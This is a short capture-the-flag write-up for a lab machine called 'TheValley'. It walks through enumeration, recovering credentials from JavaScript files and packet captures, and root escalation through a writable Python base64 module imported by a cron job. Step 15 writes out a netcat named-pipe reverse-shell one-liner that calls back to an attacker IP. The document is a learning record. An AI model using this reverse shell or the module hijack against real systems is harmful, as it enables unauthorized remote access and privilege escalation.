# CTF Writeup: TheValley

---

- Step 1: Started with basic enumeration --> nmap scan port 22,80 open --> analyzed website --> nothing found --> ran multiple 
gobuster,ffuf and dirsearch scans --> retrieved static/ dir and dirsearched for endpoints in this one --> retrieved multiple numbers
- Step 2: on endpoint /00 found a note which lead me to hidden dir: http://10.10.159.246/dev1243224123123/ --> login page
intercepted traffic, copied package in req.txt file and ran sql map with this file. --> no result
- Step 3: tried to enumerate more hidden directorys within /dev hidden dir and found /dev.js in which a function gave
me some creds username === "siemDev" & password === "california" 
- Step 4: After logging in I got prompted into an hidden .txt file, in which this is prompted dev notes for ftp server:
-stop reusing credentials
-check for any vulnerabilies
-stay up to date on patching
-change ftp port to normal port
- Step 5: in the second hidden dir I found "old.js" i retrieved a lot of user creds too from john, jane & bob. --> nothing more
- Step 6: tried to enumerate both of the hidden dir's further with dirsearch --> no result
- Step 7: made deep nmap scan since i received the information that the ftp port has change --> found it on port 37370
- Step 8: made --> ftp target_ip 37370 and downloaded the files with --> mget *pcapng
- Step 9: I analyzed all 3 network files with the filter method "http", on the last I found a POST Request in which I right clicked on and followed the HTTP Stream to get user creds --> logged in with ssh
- Step 10: retrieved user flag.txt 
- Step 11: analyzed valleyAuthenticator script --> only weird symbols --> after some research made wget'd the file on my local machine and made --> strings valleyAuthenticator > valley.txt.
- Step 12: Went into .txt file and ctrl +f'd to valley --> above it i found some hash values which i decoded --> username: valley passwd : liberty123
- Step 13: logged into ssh valley --> sudo -l doesnt work --> find / -perm -04000 -type f -ls 2>/dev/null didn't help me
- Step 14: so I had to research --> made cat /etc/crontab, where I stumbled over an cronjob which is being executed every min a python script --> script is not writable, BUT imports base64
- Step 15: checked for base64 files which are writable --> made locate base64 /usr/lib/python3.8/base64.py was writable
on the top of the script made "import os" beneath that made "os.system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.21.156.104 1234 >/tmp/f");
imported this specific revshell, because the others didn't work. Started up a listener on port 1234 & got root rce
--> retrieved root flag.
 
---

## Key Learnings

- Further strengthened user privilege methodologys.
- Strengthened enumeration methodologys.
- Learned wireshark on a base note & where to look at to retrieve user creds.
- Learned more about general ftp knowledge --> cli navigation --> mget
- Learned about small reverse engineering cli command & general methodologys --> strings

